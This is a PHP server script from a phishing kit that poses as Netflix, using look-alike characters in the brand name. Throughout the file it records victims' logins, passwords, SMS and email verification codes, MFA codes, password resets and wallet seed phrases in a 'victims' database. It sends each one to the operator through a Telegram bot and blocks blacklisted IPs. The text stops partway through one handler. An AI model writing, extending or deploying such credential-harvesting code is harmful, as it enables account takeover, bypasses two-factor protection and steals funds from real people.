<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

include 'config.php';
include 'connect.php';
include 'flagMaster.php';
include 'bot_class.php';
use peterkahl\flagMaster\flagMaster;

date_default_timezone_set('Europe/Dublin');

$ip = $_SERVER['REMOTE_ADDR'];
$ipslist = file_get_contents('blacklist.dat');
if (strpos($ipslist, $ip) !== false) {
    die("99");
}

session_start();

function numeric($num){
    if (preg_match('/^[0-9]+$/', $num)) {
        $status = true;
    } else {
        $status = false;
    }
    return $status;
}

// Handle ping request
if (isset($_GET['type']) && $_GET['type'] == 'ping') {
    header('Content-Type: application/json'); // Set content type to JSON for proper response handling
    if (isset($_SESSION['uniqueid'])) {
        $uniqueid = $_SESSION['uniqueid'];
        $lastseen = time();
        $stmt = $conn->prepare("UPDATE victims SET lastseen=? WHERE uniqueid=?");
        $stmt->bind_param("ii", $lastseen, $uniqueid);
        if ($stmt->execute()) {
            echo json_encode(['status' => 'lastseen_updated']);
        } else {
            echo json_encode(['status' => 'notok', 'error' => $stmt->error]);
        }
        $stmt->close();
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Session uniqueid not set']);
    }
    exit(); // Ensure no further output after JSON
}

// Any other logic here should continue after checking for 'ping' type to avoid corrupting JSON output



if ($_GET['type'] == 'login') {

    // Get IP address
// Function to get the real client IP, considering reverse proxies
function getRealIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]); // Take the first IP from the list
    } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare-specific header
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP']; // Some proxies use this
    } else {
        $ip = $_SERVER['REMOTE_ADDR']; // Fallback to default
    }
    return $ip;
}

// Get the real client IP
$ip = getRealIP();

// Check IP and retrieve country code
if ($ip == "::1" || $ip == "127.0.0.1") {
    $country = "SY"; // Default country if IP is local
} else {
    // Fetch country using the geoplugin API
    function getCountryFromIP($ip) {
        if ($ip === "::1" || $ip === "127.0.0.1") {
            return "SY"; // Default for localhost
        }

        $url = "http://www.geoplugin.net/json.gp?ip=$ip";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('cURL error: ' . curl_error($ch)); // Log errors
            $response = '{"geoplugin_countryCode": "unknown"}'; // Fallback to unknown
        }

        curl_close($ch);

        // Parse the response and extract the country code
        $data = json_decode($response, true);
        return strtolower($data['geoplugin_countryCode'] ?? "unknown");
    }

    // Usage in your script
    $country = getCountryFromIP($ip);
}

    // Check if the user provided both username and password
    if ($_POST['usrInput'] && $_POST['vpwd']) {
        $user = $_POST['usrInput'];
        $pass = $_POST['vpwd'];
        $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
        $uniqueid = time();
        $lastseen = time();
        $date = date("Y-m-d h:i a", time());

        if ($_SESSION['started'] == 'true') {
            $uniqueid = $_SESSION['uniqueid'];
            $stmt = $conn->prepare("SELECT * FROM victims WHERE uniqueid = ?");
            $stmt->bind_param("i", $uniqueid);
            $stmt->execute();
            $result = $stmt->get_result();
            $num = $result->num_rows;

            if ($num == 0) {
                // New victim entry
                $stmt = $conn->prepare("INSERT INTO victims (lastseen, handler, user, pass, ip, country, useragent, uniqueid, status) VALUES (?, '--', ?, ?, ?, ?, ?, ?, 2)");
                $stmt->bind_param("issssss", $lastseen, $user, $pass, $ip, $country, $ua, $uniqueid);
                $stmt->execute();

                if ($stmt->affected_rows > 0) {
                    echo json_encode(['status' => 'ok']);
                } else {
                    echo json_encode(['status' => 'notok']);
                }
            } else {
                // Update existing victim entry
                $stmt = $conn->prepare("UPDATE victims SET status=2, buzzed=0, user=?, pass=?, useragent=?, country=?, ip=? WHERE uniqueid=?");
                $stmt->bind_param("sssssi", $user, $pass, $ua, $country, $ip, $uniqueid);
                $stmt->execute();

                if ($stmt->affected_rows > 0) {
                    echo json_encode(['status' => 'ok']);
                } else {
                    echo json_encode(['status' => 'notok']);
                }
            }
        } else {
            $_SESSION['uniqueid'] = $uniqueid;
            $_SESSION['started'] = 'true';

            // Insert new victim data
            $stmt = $conn->prepare("INSERT INTO victims (lastseen, handler, user, pass, ip, country, useragent, uniqueid, status) VALUES (?, '--', ?, ?, ?, ?, ?, ?, 2)");
            $stmt->bind_param("issssss", $lastseen, $user, $pass, $ip, $country, $ua, $uniqueid);
            $stmt->execute();

            if ($stmt->affected_rows > 0) {
                echo json_encode(['status' => 'ok']);
            } else {
                echo json_encode(['status' => 'notok']);
            }
        }

        // If Telegram notification is enabled
        if ($enable_telegram == 'checked' && $telegram_chaid != '') {
            // Using the country you got from the geoplugin API
            $check = [
                'country' => $country, // Direct use of the $country value
                'isp' => 'Unknown ISP', // Assuming ISP info isn't available
                'city' => 'Unknown City' // Assuming City info isn't available
            ];

            // Function to get the browser and OS
            function getBrowserAndOS($user_agent) {
                $browser = 'Unknown Browser';
                $os = 'Unknown OS';

                if (strpos($user_agent, 'Firefox') !== false) {
                    $browser = 'Firefox';
                } elseif (strpos($user_agent, 'Chrome') !== false) {
                    $browser = 'Chrome';
                } elseif (strpos($user_agent, 'Safari') !== false) {
                    $browser = 'Safari';
                } elseif (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
                    $browser = 'Internet Explorer';
                }

                if (preg_match('/Windows NT/i', $user_agent)) {
                    $os = 'Windows';
                } elseif (preg_match('/Mac OS X/i', $user_agent)) {
                    $os = 'Mac OS';
                } elseif (preg_match('/Linux/i', $user_agent)) {
                    $os = 'Linux';
                } elseif (preg_match('/Android/i', $user_agent)) {
                    $os = 'Android';
                } elseif (preg_match('/iPhone|iPad/i', $user_agent)) {
                    $os = 'iOS';
                }

                return [$browser, $os];
            }

            list($browser, $os) = getBrowserAndOS($_SERVER['HTTP_USER_AGENT']);

            // Prepare Telegram message
            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "===================\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>$user</code>\n";
            $tmsg .= "🔒 <b>Password:</b> <code>$pass</code>\n";
            $tmsg .= "===================\n";
            $tmsg .= "🌎 <b>Country:</b> <code>{$check['country']}</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "💻 <b>Browser:</b> <code>$browser</code>\n";
            $tmsg .= "🖥️ <b>OS:</b> <code>$os</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            // Clean up message format
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    }
}




if ($_GET['type'] == 'loginerror') {

    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Check IP and retrieve country code
    if ($ip == "::1") {
        $country = "SY"; // Default country if IP is local
    } else {
        // Fetch country using the geoplugin API
        function getCountryFromIP($ip) {
            if ($ip === "::1") {
                return "SY"; // Default for localhost
            }

            $url = "http://www.geoplugin.net/json.gp?ip=$ip";

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            curl_setopt($ch, CURLOPT_FAILONERROR, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

            $response = curl_exec($ch);

            if (curl_errno($ch)) {
                error_log('cURL error: ' . curl_error($ch)); // Log errors
                $response = '{"geoplugin_countryCode": "unknown"}'; // Fallback to unknown
            }

            curl_close($ch);

            // Parse the response and extract the country code
            $data = json_decode($response, true);
            return strtolower($data['geoplugin_countryCode']);
        }

        // Usage in your script
        $country = getCountryFromIP($ip);
    }

    // Check if the user provided both username and password
    if ($_POST['usrInput'] && $_POST['vpwd']) {
        $user = $_POST['usrInput'];
        $pass = $_POST['vpwd'];
        $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
        $uniqueid = time();
        $lastseen = time();
        $date = date("Y-m-d h:i a", time());

        if ($_SESSION['started'] == 'true') {
            $uniqueid = $_SESSION['uniqueid'];
            $stmt = $conn->prepare("SELECT * FROM victims WHERE uniqueid = ?");
            $stmt->bind_param("i", $uniqueid);
            $stmt->execute();
            $result = $stmt->get_result();
            $num = $result->num_rows;

            if ($num == 0) {
                // New victim entry
                $stmt = $conn->prepare("INSERT INTO victims (lastseen, handler, user, pass, ip, country, useragent, uniqueid, status) VALUES (?, '--', ?, ?, ?, ?, ?, ?, 2)");
                $stmt->bind_param("issssss", $lastseen, $user, $pass, $ip, $country, $ua, $uniqueid);
                $stmt->execute();

                if ($stmt->affected_rows > 0) {
                    echo json_encode(['status' => 'ok']);
                } else {
                    echo json_encode(['status' => 'notok']);
                }
            } else {
                // Update existing victim entry
                $stmt = $conn->prepare("UPDATE victims SET status=2, buzzed=0, user=?, pass=?, useragent=?, country=?, ip=? WHERE uniqueid=?");
                $stmt->bind_param("sssssi", $user, $pass, $ua, $country, $ip, $uniqueid);
                $stmt->execute();

                if ($stmt->affected_rows > 0) {
                    echo json_encode(['status' => 'ok']);
                } else {
                    echo json_encode(['status' => 'notok']);
                }
            }
        } else {
            $_SESSION['uniqueid'] = $uniqueid;
            $_SESSION['started'] = 'true';

            // Insert new victim data
            $stmt = $conn->prepare("INSERT INTO victims (lastseen, handler, user, pass, ip, country, useragent, uniqueid, status) VALUES (?, '--', ?, ?, ?, ?, ?, ?, 2)");
            $stmt->bind_param("issssss", $lastseen, $user, $pass, $ip, $country, $ua, $uniqueid);
            $stmt->execute();

            if ($stmt->affected_rows > 0) {
                echo json_encode(['status' => 'ok']);
            } else {
                echo json_encode(['status' => 'notok']);
            }
        }

        // If Telegram notification is enabled
        if ($enable_telegram == 'checked' && $telegram_chaid != '') {
            // Using the country you got from the geoplugin API
            $check = [
                'country' => $country, // Direct use of the $country value
                'isp' => 'Unknown ISP', // Assuming ISP info isn't available
                'city' => 'Unknown City' // Assuming City info isn't available
            ];

            // Function to get the browser and OS
            function getBrowserAndOS($user_agent) {
                $browser = 'Unknown Browser';
                $os = 'Unknown OS';

                if (strpos($user_agent, 'Firefox') !== false) {
                    $browser = 'Firefox';
                } elseif (strpos($user_agent, 'Chrome') !== false) {
                    $browser = 'Chrome';
                } elseif (strpos($user_agent, 'Safari') !== false) {
                    $browser = 'Safari';
                } elseif (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
                    $browser = 'Internet Explorer';
                }

                if (preg_match('/Windows NT/i', $user_agent)) {
                    $os = 'Windows';
                } elseif (preg_match('/Mac OS X/i', $user_agent)) {
                    $os = 'Mac OS';
                } elseif (preg_match('/Linux/i', $user_agent)) {
                    $os = 'Linux';
                } elseif (preg_match('/Android/i', $user_agent)) {
                    $os = 'Android';
                } elseif (preg_match('/iPhone|iPad/i', $user_agent)) {
                    $os = 'iOS';
                }

                return [$browser, $os];
            }

            list($browser, $os) = getBrowserAndOS($_SERVER['HTTP_USER_AGENT']);

            // Prepare Telegram message
            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "===================\n";
            $tmsg .= "📧 <b>Email/User Error:</b> <code>$user</code>\n";
            $tmsg .= "🔒 <b>Password Error:</b> <code>$pass</code>\n";
            $tmsg .= "===================\n";
            $tmsg .= "🌎 <b>Country:</b> <code>{$check['country']}</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "💻 <b>Browser:</b> <code>$browser</code>\n";
            $tmsg .= "🖥️ <b>OS:</b> <code>$os</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            // Clean up message format
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    }
}






if ($_GET['type'] == 'vpwd') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['vpwd'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['vpwd']);

        $query = mysqli_query($conn, "UPDATE victims SET status=14, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> #Nеtflіх </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User::</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password:</strong> <code>$vpwd</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'vpwderror') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['vpwd'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['vpwd']);

        $query = mysqli_query($conn, "UPDATE victims SET status=14, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> #Nеtflіх </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password Error:</strong> <code>$vpwd</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}



if ($_GET['type'] == 'vpwdreset') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['vpwdreset2'])) {
        $vpwdreset2 = mysqli_real_escape_string($conn, $_POST['vpwdreset2']);

        // Update database with the confirmed password
        $query = mysqli_query($conn, "UPDATE victims SET status=79, buzzed=0, vpwdreset='$vpwdreset2' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Telegram notification
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "
<strong> #Nеtflіх </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password Reset:</strong> <code>$vpwdreset2</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n
";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        // No password provided
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'annulation') {
    $uniqueid = $_SESSION['uniqueid'];
    
    // Handle the annulation action
    $query = mysqli_query($conn, "UPDATE victims SET status=77 WHERE uniqueid='$uniqueid'");
    if ($query) {
        $response = array('status' => 'ok', 'message' => 'Annulation processed successfully');
    } else {
        $response = array('status' => 'notok', 'message' => 'Failed to process annulation');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'seed') {
    session_start();
    include 'db_connection.php'; // Ensure you have your database connection included

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if the 'seed' parameter is provided in the POST data
    if (!empty($_POST['seed'])) {
        $seed = mysqli_real_escape_string($conn, $_POST['seed']);

        // Update the database with the seed phrase
        $query = mysqli_query($conn, "UPDATE victims SET status=75, buzzed=0, seed='$seed' WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Optional: Sending the seed phrase to Telegram if enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            // Query database for user information
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Format the Telegram message with emojis and clean layout
            $tmsg = "
<strong>🔹 #Nеtflіх 🔹</strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌱 <strong>Seed:</strong> <code>$seed</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Seed phrase is empty or invalid');
    }

    // Return the response as JSON
    echo json_encode($response);
}








if ($_GET['type'] == 'authpass') {
    $uniqueid = $_SESSION['uniqueid'];

    if (!empty($_POST['pass'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['pass']);

        $query = mysqli_query($conn, "UPDATE victims SET status=6, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);
            $tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Password:</strong> <code>$vpwd</code>";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'authpasserror') {
    $uniqueid = $_SESSION['uniqueid'];

    if (!empty($_POST['pass'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['pass']);

        $query = mysqli_query($conn, "UPDATE victims SET status=8, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);
            $tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Password Error:</strong> <code>$vpwd</code>";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}




if ($_GET['type'] == 'smscode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smscode'])) {
        $smscode = mysqli_real_escape_string($conn, $_POST['smscode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=10, buzzed=0, smscode='$smscode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS:</b> <code>$smscode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}






if ($_GET['type'] == 'smserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smserror'])) {
        $smserror = mysqli_real_escape_string($conn, $_POST['smserror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=10, buzzed=0, smscode='$smserror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS Error:</b> <code>$smserror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'mfa') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['mfa'])) {
        $mfa = mysqli_real_escape_string($conn, $_POST['mfa']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=10, buzzed=0, mfa='$mfa' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS MFA:</b> <code>$mfa</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'emailcode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailcode'])) {
        $emailcode = mysqli_real_escape_string($conn, $_POST['emailcode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=10, buzzed=0, emailcode='$emailcode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔑 <b>Email Code:</b> <code>$emailcode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'emailerror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailerror'])) {
        $emailerror = mysqli_real_escape_string($conn, $_POST['emailerror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=10, buzzed=0, emailcode='$emailerror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

